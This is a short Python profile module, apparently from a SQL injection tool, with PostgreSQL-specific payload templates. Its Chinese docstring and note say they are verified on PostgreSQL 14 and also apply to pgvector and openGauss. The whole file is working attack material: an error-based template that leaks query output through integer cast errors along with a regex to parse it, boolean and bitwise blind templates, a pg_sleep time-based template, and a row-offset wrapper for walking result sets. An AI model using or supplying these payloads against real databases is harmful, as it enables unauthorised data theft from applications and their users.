"""PostgreSQL — 报错用 CAST, 末尾拼 CHR(120) 保证纯数值也报错。也是 pgvector/openGauss 的基座。"""

PROFILE = {
    'name': 'postgres',
    'note': 'PostgreSQL 14 (error/bool/time/union 已验证)',
    'err_tpl':   " AND 1=(SELECT CAST(CASE WHEN ({Q})::text IS NULL THEN NULL ELSE SUBSTRING(({Q})::text,{P},{N})||CHR(120) END AS int))",
    'err_regex': '(?:type )?integer: "([^"]*)"',
    'err_chunk': 500,
    'err_strip': 1,
    'bool_tpl':  " AND ascii(substr(({Q}),{P},1))>{K}",
    'bit_tpl':   " AND (ascii(substr(({Q}),{P},1))&{M})>0",
    'time_tpl':  " AND (SELECT CASE WHEN ascii(substr(({Q}),{P},1))>{K} THEN pg_sleep({T}) ELSE pg_sleep(0) END) IS NULL",
    'row_wrap':  "SELECT * FROM ({Q}) x LIMIT 1 OFFSET {R}",
}
